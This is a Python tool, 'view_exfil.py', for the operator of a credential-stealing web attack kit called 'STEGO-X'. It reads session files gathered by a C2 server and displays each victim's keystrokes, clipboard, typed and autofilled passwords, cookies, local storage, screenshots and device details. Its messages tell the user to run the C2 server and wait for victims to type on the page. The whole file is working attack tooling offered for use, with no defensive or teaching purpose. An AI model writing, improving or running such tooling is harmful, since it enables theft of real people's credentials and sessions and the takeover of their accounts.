"""
view_exfil.py — Exfil Data Viewer
See everything that was stolen — full data, no truncation.

Usage:
  python view_exfil.py              # show all sessions summary
  python view_exfil.py --last       # show latest session in full
  python view_exfil.py --session 3  # show specific session number
  python view_exfil.py --shots      # list all saved screenshots
  python view_exfil.py --open       # open screenshots folder
  python view_exfil.py --keys       # show all keylog data only
  python view_exfil.py --cookies    # show all cookies only
"""

import json, os, argparse, glob
from datetime import datetime

# ── Colors (no rich dependency needed)
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
DIM    = "\033[2m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

BANNER = f"""
{GREEN}{BOLD}
  ███████╗██╗  ██╗███████╗██╗██╗         ██╗   ██╗██╗███████╗██╗    ██╗███████╗██████╗
  ██╔════╝╚██╗██╔╝██╔════╝██║██║         ██║   ██║██║██╔════╝██║    ██║██╔════╝██╔══██╗
  █████╗   ╚███╔╝ █████╗  ██║██║         ██║   ██║██║█████╗  ██║ █╗ ██║█████╗  ██████╔╝
  ██╔══╝   ██╔██╗ ██╔══╝  ██║██║         ╚██╗ ██╔╝██║██╔══╝  ██║███╗██║██╔══╝  ██╔══██╗
  ███████╗██╔╝ ██╗██║     ██║███████╗     ╚████╔╝ ██║███████╗╚███╔███╔╝███████╗██║  ██║
  ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝      ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝
{RESET}"""


def load_sessions():
    """Load all full exfil sessions from exfil_sessions/ folder"""
    sessions = []
    files    = sorted(glob.glob("exfil_sessions/session_*.json"))
    for f in files:
        try:
            with open(f, encoding="utf-8") as fp:
                s = json.load(fp)
                s["_file"] = f
                sessions.append(s)
        except Exception:
            pass
    return sessions


def load_log():
    """Load all entries from exfil_log.json"""
    entries = []
    if not os.path.exists("exfil_log.json"):
        return entries
    with open("exfil_log.json", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line:
                try:
                    entries.append(json.loads(line))
                except Exception:
                    pass
    return entries


def print_separator(title=""):
    w = 70
    if title:
        pad = (w - len(title) - 2) // 2
        print(f"{DIM}{'─'*pad} {CYAN}{title}{RESET}{DIM} {'─'*pad}{RESET}")
    else:
        print(f"{DIM}{'─'*w}{RESET}")


def print_field(key, value, color=WHITE):
    key_str = f"{CYAN}{key.upper():<26}{RESET}"
    val_str = str(value)
    print(f"  {key_str} {color}{val_str}{RESET}")


def show_summary(sessions):
    print(BANNER)
    print(f"\n{BOLD}{GREEN}  EXFIL SESSIONS SUMMARY{RESET}")
    print_separator()

    if not sessions:
        print(f"\n  {YELLOW}No sessions found in exfil_sessions/{RESET}")
        print(f"  {DIM}Run the C2 server and wait for victims to connect.{RESET}\n")
        return

    print(f"\n  {GREEN}Total sessions: {BOLD}{len(sessions)}{RESET}\n")

    for i, s in enumerate(sessions, 1):
        d   = s.get("data", {})
        ip  = s.get("ip", "unknown")
        ts  = s.get("time", "unknown")
        sz  = s.get("size", 0)

        status  = d.get("status", "unknown")
        screen  = d.get("screen",  "[unknown]")
        tz      = d.get("timezone","[unknown]")
        ua      = d.get("user_agent","")[:60]
        cookies = d.get("cookies","")[:50]
        keys    = d.get("keylog_live", d.get("keylog_so_far",""))[:40]
        clip    = d.get("clipboard_live", d.get("clipboard_last",""))[:40]

        status_color = RED if status == "COMPROMISED" else YELLOW
        print(f"  {BOLD}{RED}SESSION #{i}{RESET}  {DIM}{ts}{RESET}  "
              f"{CYAN}{ip}{RESET}  {DIM}({sz} bytes){RESET}")
        print(f"    {DIM}Status   :{RESET} {status_color}{status}{RESET}")
        print(f"    {DIM}Screen   :{RESET} {WHITE}{screen}{RESET}")
        print(f"    {DIM}Timezone :{RESET} {WHITE}{tz}{RESET}")
        print(f"    {DIM}Browser  :{RESET} {DIM}{ua}...{RESET}")
        if cookies and cookies != "[no cookies]":
            print(f"    {DIM}Cookies  :{RESET} {YELLOW}{cookies}...{RESET}")
        if keys and keys not in ("[none yet]", ""):
            print(f"    {DIM}Keylog   :{RESET} {YELLOW}{keys}...{RESET}")
        if clip and clip not in ("[none yet]", ""):
            print(f"    {DIM}Clipboard:{RESET} {YELLOW}{clip}...{RESET}")
        print(f"    {DIM}File     :{RESET} {DIM}{s.get('_file','')}{RESET}")
        print()

    print(f"  {DIM}Use --last to see full data of latest session{RESET}")
    print(f"  {DIM}Use --session N to see specific session{RESET}")
    print(f"  {DIM}Use --shots to see captured screenshots{RESET}\n")


def show_full_session(session, num):
    d  = session.get("data", {})
    ip = session.get("ip",   "unknown")
    ts = session.get("time", "unknown")
    sz = session.get("size", 0)

    print(BANNER)
    print(f"\n{BOLD}{RED}  SESSION #{num} — FULL DATA{RESET}")
    print_separator()
    print(f"\n  {CYAN}FROM:{RESET} {ip}  {CYAN}TIME:{RESET} {ts}  "
          f"{CYAN}SIZE:{RESET} {sz} bytes\n")

    sections = [
        ("STEGO COMMAND", ["c2_command", "status", "cred_source"], RED),
        ("KEYLOGGER",     ["keylog_live", "keylog_so_far", "keylog_final"], YELLOW),
        ("CLIPBOARD",     ["clipboard_live", "clipboard_last"], YELLOW),
        ("SCREENSHOT",    ["screenshot_status"], GREEN),
        ("CREDENTIALS",   ["typed_email", "typed_pass",
                           "autofill_user", "autofill_email", "autofill_pass"], YELLOW),
        ("COOKIES",       ["cookies"], YELLOW),
        ("LOCAL STORAGE", ["local_storage"], YELLOW),
        ("DEVICE",        ["screen", "timezone", "platform", "gpu_renderer",
                           "memory_gb", "cpu_cores", "connection",
                           "touch_points", "language", "do_not_track"], WHITE),
        ("BROWSER",       ["user_agent"], DIM),
        ("TIMESTAMP",     ["timestamp"], DIM),
    ]

    for sec_name, keys, color in sections:
        found = [(k, d[k]) for k in keys if k in d
                 and str(d[k]) not in ("[not typed]","[empty]","unknown","[none yet]","unset")]
        if found:
            print_separator(sec_name)
            for k, v in found:
                val = str(v)
                # For long values like storage/user_agent, print on next line
                if len(val) > 80:
                    print(f"\n  {CYAN}{k.upper()}{RESET}")
                    # Pretty print JSON if it looks like JSON
                    if val.startswith("{") or val.startswith("["):
                        try:
                            parsed = json.loads(val)
                            for jk, jv in (parsed.items() if isinstance(parsed, dict)
                                           else enumerate(parsed)):
                                print(f"    {CYAN}{str(jk):<30}{RESET} "
                                      f"{color}{str(jv)[:100]}{RESET}")
                        except Exception:
                            # Print in chunks of 80 chars
                            for chunk_start in range(0, min(len(val), 800), 80):
                                print(f"    {color}{val[chunk_start:chunk_start+80]}{RESET}")
                    else:
                        for chunk_start in range(0, min(len(val), 800), 80):
                            print(f"    {color}{val[chunk_start:chunk_start+80]}{RESET}")
                    print()
                else:
                    print_field(k, val, color)
            print()

    print(f"\n  {DIM}Full JSON file: {session.get('_file', 'N/A')}{RESET}\n")


def show_screenshots():
    shots = sorted(glob.glob("exfil_screenshots/screen_*.png"))
    print(BANNER)
    print(f"\n{BOLD}{GREEN}  CAPTURED SCREENSHOTS{RESET}")
    print_separator()

    if not shots:
        print(f"\n  {YELLOW}No screenshots found in exfil_screenshots/{RESET}")
        print(f"  {DIM}Screenshots are captured automatically when victim visits the page.{RESET}\n")
        return

    print(f"\n  {GREEN}Total screenshots: {BOLD}{len(shots)}{RESET}\n")
    for i, f in enumerate(shots, 1):
        size = os.path.getsize(f)
        # Parse timestamp from filename
        parts = os.path.basename(f).replace(".png","").split("_")
        ts    = parts[-2] + "_" + parts[-1] if len(parts) >= 2 else "unknown"
        ip    = ".".join(parts[1:5]) if len(parts) >= 5 else "unknown"
        print(f"  {CYAN}#{i}{RESET}  {WHITE}{f}{RESET}  "
              f"{DIM}{size:,} bytes{RESET}")

    print(f"\n  {DIM}Open folder:{RESET} {CYAN}explorer exfil_screenshots{RESET}  "
          f"(Windows)\n")


def show_keylog_only(sessions):
    print(BANNER)
    print(f"\n{BOLD}{YELLOW}  ALL KEYLOG DATA{RESET}")
    print_separator()

    found_any = False
    for i, s in enumerate(sessions, 1):
        d    = s.get("data", {})
        keys = d.get("keylog_live", d.get("keylog_so_far", ""))
        if keys and keys not in ("[none yet]", ""):
            found_any = True
            print(f"\n  {RED}SESSION #{i}{RESET}  {DIM}{s.get('time')}  {s.get('ip')}{RESET}")
            print(f"  {YELLOW}{keys}{RESET}")

    # Also check log file for keylog batches
    entries = load_log()
    batches = [e for e in entries if "keylog" in e.get("type", "")]
    if batches:
        print(f"\n  {DIM}--- KEYLOG BATCHES FROM LOG ---{RESET}")
        for b in batches:
            found_any = True
            print(f"  {DIM}{b.get('time')}  {b.get('ip')}{RESET}  "
                  f"{YELLOW}{b.get('value','')}{RESET}")

    if not found_any:
        print(f"\n  {YELLOW}No keylog data yet.{RESET}")
        print(f"  {DIM}Victim needs to type something on the page.{RESET}\n")


def show_cookies_only(sessions):
    print(BANNER)
    print(f"\n{BOLD}{YELLOW}  ALL COOKIES{RESET}")
    print_separator()

    found_any = False
    for i, s in enumerate(sessions, 1):
        d       = s.get("data", {})
        cookies = d.get("cookies", "")
        if cookies and cookies != "[no cookies]":
            found_any = True
            print(f"\n  {RED}SESSION #{i}{RESET}  "
                  f"{DIM}{s.get('time')}  {s.get('ip')}{RESET}")
            # Split cookies by ; and print each one
            for cookie in cookies.split(";"):
                c = cookie.strip()
                if c:
                    print(f"    {CYAN}•{RESET} {YELLOW}{c}{RESET}")

    if not found_any:
        print(f"\n  {YELLOW}No cookies captured yet.{RESET}\n")


def main():
    p = argparse.ArgumentParser(description="STEGO-X Exfil Viewer")
    p.add_argument("--last",        action="store_true", help="Show latest session in full")
    p.add_argument("--session",     type=int,            help="Show specific session number")
    p.add_argument("--shots",       action="store_true", help="List all screenshots")
    p.add_argument("--open",        action="store_true", help="Open screenshots folder")
    p.add_argument("--keys",        action="store_true", help="Show keylog data only")
    p.add_argument("--cookies",     action="store_true", help="Show cookies only")
    a = p.parse_args()

    sessions = load_sessions()

    if a.open:
        os.system("explorer exfil_screenshots")
        return

    if a.shots:
        show_screenshots()
        return

    if a.keys:
        show_keylog_only(sessions)
        return

    if a.cookies:
        show_cookies_only(sessions)
        return

    if a.last:
        if not sessions:
            print(f"\n{YELLOW}No sessions found yet.{RESET}\n")
            return
        show_full_session(sessions[-1], len(sessions))
        return

    if a.session:
        if a.session < 1 or a.session > len(sessions):
            print(f"\n{YELLOW}Session #{a.session} not found. "
                  f"Total sessions: {len(sessions)}{RESET}\n")
            return
        show_full_session(sessions[a.session - 1], a.session)
        return

    # Default: show summary
    show_summary(sessions)


if __name__ == "__main__":
    main()
